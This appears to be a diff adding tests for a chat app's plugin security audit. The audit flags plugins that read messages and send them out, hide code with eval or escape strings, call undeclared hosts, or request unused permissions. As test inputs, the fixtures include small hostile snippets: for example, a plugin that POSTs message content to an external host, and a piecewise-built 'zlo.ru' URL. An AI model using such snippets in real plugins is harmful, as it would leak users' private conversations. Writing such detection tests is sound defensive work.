@@ -7,6 +7,7 @@
 // зарегистрировать то, что обещает в описании.
 //
 // Запуск: npm run test:plugins
+import { auditPlugin, auditBadge, hiddenCode, unusedPerms, AUDIT_NOTE, AUDITED_PERMISSIONS } from './audit'
 import { parsePlugin } from './manifest'
 import { OFFICIAL_PLUGINS } from './official'
 import { ALL_PERMISSIONS, PLUGIN_EVENTS } from './types'
@@ -475,6 +476,8 @@ for (const p of OFFICIAL_PLUGINS) {
     'voice.setEffect', 'voice.effects', 'voice.current', 'notify',
     'storage.get', 'storage.set', 'storage.remove', 'storage.keys',
     'net.fetch', 'subscribe', 'me', 'channel',
+    // v1.445.0: ответ по кускам — без него своя ИИ-модель в плагине невозможна.
+    'net.stream',
     // v1.417.0: панель в приложении и музыка.
     'ui.addPanel', 'music.now', 'music.library', 'music.play', 'music.pause',
     'music.next', 'music.prev', 'music.queue', 'music.add',
@@ -628,6 +631,144 @@ for (const p of OFFICIAL_PLUGINS) {
 
   check('просьба к ИИ про бота устроена так же', () =>
     /НЕ пиши код/.test(AI_BOT_PROMPT_PREFIX) && AI_BOT_PROMPT_PREFIX.includes('X-Ponoi-Signature'))
+
+  // -- v1.445.0: отметка безопасности в каталоге ------------------------------
+  // В каталоге все плагины выглядели одинаково, и отличить честный от того, что
+  // читает переписку и шлёт её на сторону, можно было только прочитав код.
+  console.log('\n-- Отметка безопасности --')
+
+  const шапка = (perms: string, hosts: string[] = []) =>
+    ({ permissions: perms.split(',').map(x => x.trim()).filter(Boolean) as any, hosts })
+
+  check('чистый плагин замечаний не собирает', () => {
+    const код = `function onLoad(ponoi){ ponoi.commands.register('x','y',()=>ponoi.notify('!')) }`
+    const r = auditPlugin(код, шапка('commands, notify'))
+    return r.level === 'clean' && r.findings.length === 0
+  })
+
+  check('переписка плюс интернет — это опасно и так и называется', () => {
+    const код = `function onLoad(ponoi){ ponoi.on('message', m => ponoi.net.fetch('https://a.ru', {method:'POST', body:m.content})) }`
+    const r = auditPlugin(код, шапка('messages.read, net', ['a.ru']))
+    return r.level === 'unsafe' && r.findings.some(f => f.code === 'read-and-net')
+  })
+
+  check('спрятанный код — тоже опасно', () => {
+    const r1 = auditPlugin('function onLoad(){ eval("1+1") }', шапка(''))
+    const r2 = auditPlugin('function onLoad(){ new Function("return 1")() }', шапка(''))
+    return r1.level === 'unsafe' && r2.level === 'unsafe'
+      && r1.findings.some(f => f.code === 'hidden')
+  })
+
+  check('длинная строка из escape-последовательностей считается спрятанным кодом', () => {
+    const длинная = '\\x41'.repeat(50)
+    return hiddenCode('var s = "' + длинная + '"').includes('escape-строки')
+  })
+
+  check('обычный код за спрятанный не принимается', () => {
+    // Иначе отметка «небезопасный» повисла бы на половине каталога и её
+    // перестали бы читать.
+    const код = `function onLoad(ponoi){ const s = "привет"; ponoi.notify(s) }`
+    return hiddenCode(код).length === 0
+  })
+
+  check('адрес не из @hosts виден в замечаниях', () => {
+    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://tajno.ru/x') }`
+    const r = auditPlugin(код, шапка('net', ['dobro.ru']))
+    return r.findings.some(f => f.code === 'undeclared-host' && f.text.includes('tajno.ru'))
+  })
+
+  check('объявленный адрес замечанием не считается', () => {
+    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://www.dobro.ru/x') }`
+    const r = auditPlugin(код, шапка('net', ['dobro.ru']))
+    return !r.findings.some(f => f.code === 'undeclared-host')
+  })
+
+  check('адреса из комментариев и примеров не считаются', () => {
+    const код = `/** @hosts a.ru */\n// см. https://example.com/doc\nfunction onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
+    const r = auditPlugin(код, шапка('net', ['a.ru']))
+    return !r.findings.some(f => f.code === 'undeclared-host')
+  })
+
+  check('поход в сеть без разрешения назван прямо', () => {
+    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
+    const r = auditPlugin(код, шапка('notify'))
+    return r.findings.some(f => f.code === 'net-without-perm')
+  })
+
+  check('лишнее разрешение видно', () => {
+    const код = `function onLoad(ponoi){ ponoi.notify('!') }`
+    const r = auditPlugin(код, шапка('notify, storage'))
+    return r.findings.some(f => f.code === 'unused-perms' && f.text.includes('storage'))
+  })
+
+  check('разрешение, упомянутое только в шапке, лишним и остаётся', () => {
+    // Шапка сама перечисляет все разрешения — если её не выкинуть, «лишних» не
+    // нашлось бы никогда.
+    const код = `/** @permissions storage */\nfunction onLoad(ponoi){ ponoi.notify('!') }`
+    return auditPlugin(код, шапка('notify, storage')).findings.some(f => f.code === 'unused-perms')
+  })
+
+  check('разбор узнаёт каждое разрешение', () => {
+    // Появится новое, за которым в коде не видно следа, — каталог начнёт ругать
+    // за него все плагины подряд, и отметка обесценится.
+    const слепые = AUDITED_PERMISSIONS.filter(p => {
+      // Код, который это разрешение честно использует, не должен считаться
+      // «просит больше, чем делает».
+      const прим: Record<string, string> = {
+        'ui': 'ponoi.ui.addComposerButton()', 'css': 'ponoi.css("")',
+        'commands': 'ponoi.commands.register()', 'messages.read': "ponoi.on('message',()=>{})",
+        'messages.write': 'ponoi.messages.send()', 'storage': 'ponoi.storage.get()',
+        'net': 'ponoi.net.fetch()', 'settings': 'ponoi.ui.addSettingsPage()',
+        'notify': 'ponoi.notify()', 'voice': 'ponoi.voice.list()',
+        'context': 'ponoi.me()', 'panel': 'ponoi.ui.addPanel()',
+        'music': 'ponoi.music.state()', 'navigate': 'ponoi.open()', 'status': 'ponoi.status.set()',
+      }
+      const код = прим[p]
+      if (!код) return true
+      return unusedPerms('function onLoad(ponoi){ ' + код + ' }', [p]).length > 0
+    })
+    if (слепые.length) throw new Error('разбор не видит: ' + слепые.join(', '))
+    return true
+  })
+
+  check('подпись для каталога называет вещи своими именами', () => {
+    const плохо = auditBadge({ level: 'unsafe', findings: [] }, true)
+    const так = auditBadge({ level: 'warn', findings: [] }, false)
+    const свой = auditBadge({ level: 'clean', findings: [] }, true)
+    const чужой = auditBadge({ level: 'clean', findings: [] }, false)
+    // Официальность НЕ отменяет разбора: опасный официальный остаётся опасным.
+    return плохо.text === 'Небезопасный' && плохо.kind === 'bad'
+      && так.text === 'Есть замечания' && свой.text === 'От создателей'
+      && чужой.text === 'Не проверен'
+  })
+
+  check('приложение не обещает, что отметка — это гарантия', () =>
+    /не проверка человеком/.test(AUDIT_NOTE) && /песочниц/.test(AUDIT_NOTE))
+
+  check('официальные плагины разбор проходят', () => {
+    // Они идут в самой сборке и ставятся всем: если хоть один собирает
+    // замечание, это наш плагин просит лишнего, а не разбор придирается.
+    const плохие = OFFICIAL_PLUGINS
+      .map(p => ({ id: parsePlugin(p.code).id, r: auditPlugin(p.code, parsePlugin(p.code)) }))
+      .filter(x => x.r.level !== 'clean')
+    if (плохие.length) throw new Error(плохие.map(x => x.id + ': ' + x.r.findings.map(f => f.text).join('; ')).join(' / '))
+    return true
+  })
+
+  console.log('\n-- Ломаем нарочно (отметка) --')
+  check('разбор заметил бы плагин, который прячет свой адрес', () => {
+    const код = `function onLoad(ponoi){ const a = 'https://' + 'zlo' + '.ru'; ponoi.net.fetch(a) }`
+    // Собранный по кускам адрес разбор НЕ увидит — и это честно названо
+    // в самом файле: статический разбор обойти можно. Но такой код почти всегда
+    // тянет за собой и другие признаки, и хотя бы один из них должен сработать.
+    const r = auditPlugin(код + ' eval("x")', шапка('net', []))
+    return r.level === 'unsafe'
+  })
+  check('разбор заметил бы пропажу проверки «переписка + сеть»', () => {
+    const r = auditPlugin('function onLoad(ponoi){ ponoi.on("message",()=>ponoi.net.fetch("https://a.ru")) }',
+      шапка('messages.read, net', ['a.ru']))
+    return r.findings.filter(f => f.level === 'danger').length === 1
+  })
 
   console.log(`\nИТОГ: пройдено ${pass}, провалено ${fail}`)
   process.exit(fail ? 1 : 0)
